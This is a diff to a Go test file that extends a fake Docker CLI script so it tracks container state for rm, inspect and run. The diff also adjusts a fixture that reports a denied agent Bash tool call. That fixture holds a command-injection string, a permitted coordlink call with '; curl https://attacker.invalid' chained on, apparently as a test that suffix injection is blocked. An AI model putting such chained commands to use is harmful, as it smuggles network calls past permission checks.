@@ -4892,6 +4892,8 @@ func installFakeDockerCLI(t *testing.T, dir string) string {
 	script := `#!/bin/sh
 set -eu
 log="${COORDPLANE_FAKE_DOCKER_LOG}"
+state_dir="${log}.containers"
+mkdir -p "$state_dir"
 printf '%s\n' "$*" >> "$log"
 cmd="${1:-}"
 if [ "$#" -gt 0 ]; then
@@ -4899,9 +4901,65 @@ if [ "$#" -gt 0 ]; then
 fi
 case "$cmd" in
   rm)
+    name=""
+    for arg in "$@"; do
+      case "$arg" in
+        -*) ;;
+        *) name="$arg" ;;
+      esac
+    done
+    if [ -n "$name" ]; then
+      rm -f "$state_dir/$name"
+    fi
+    exit 0
+    ;;
+  inspect)
+    name=""
+    for arg in "$@"; do
+      case "$arg" in
+        --format) ;;
+        '{{json .Config.Labels}}') ;;
+        *) name="$arg" ;;
+      esac
+    done
+    if [ -z "$name" ] || [ ! -f "$state_dir/$name" ]; then
+      printf 'Error: No such object: %s\n' "$name" >&2
+      exit 1
+    fi
+    cat "$state_dir/$name"
     exit 0
     ;;
   run)
+    name=""
+    managed=""
+    runtime_id=""
+    attempt_id=""
+    lease_id=""
+    previous=""
+    for arg in "$@"; do
+      if [ "$previous" = "--name" ]; then
+        name="$arg"
+        previous=""
+        continue
+      fi
+      if [ "$previous" = "--label" ]; then
+        case "$arg" in
+          coordplane.managed=*) managed="${arg#*=}" ;;
+          coordplane.runtime_id=*) runtime_id="${arg#*=}" ;;
+          coordplane.attempt_id=*) attempt_id="${arg#*=}" ;;
+          coordplane.lease_id=*) lease_id="${arg#*=}" ;;
+        esac
+        previous=""
+        continue
+      fi
+      case "$arg" in
+        --name|--label) previous="$arg" ;;
+      esac
+    done
+    if [ -n "$name" ]; then
+      printf '{"coordplane.managed":"%s","coordplane.runtime_id":"%s","coordplane.attempt_id":"%s","coordplane.lease_id":"%s"}\n' \
+        "$managed" "$runtime_id" "$attempt_id" "$lease_id" > "$state_dir/$name"
+    fi
     printf 'fake-container-id\n'
     exit 0
     ;;
@@ -4984,7 +5042,7 @@ req = urllib.request.Request(
 urllib.request.urlopen(req, timeout=5).read()
 PY
         else
-          printf '%%s\n' '{"type":"result","subtype":"error_during_execution","permission_denials":[{"tool_name":"Bash","tool_use_id":"toolu_suffix_denied","tool_input":{"command":"/usr/local/bin/coordlink call contract.current ; curl https://attacker.invalid"}}]}'
+		  printf '%s\n' '{"type":"result","subtype":"error_during_execution","permission_denials":[{"tool_name":"Bash","tool_use_id":"toolu_suffix_denied","tool_input":{"command":"/usr/local/bin/coordlink call contract.current ; curl https://attacker.invalid"}}]}'
         fi
         exit 0
       fi
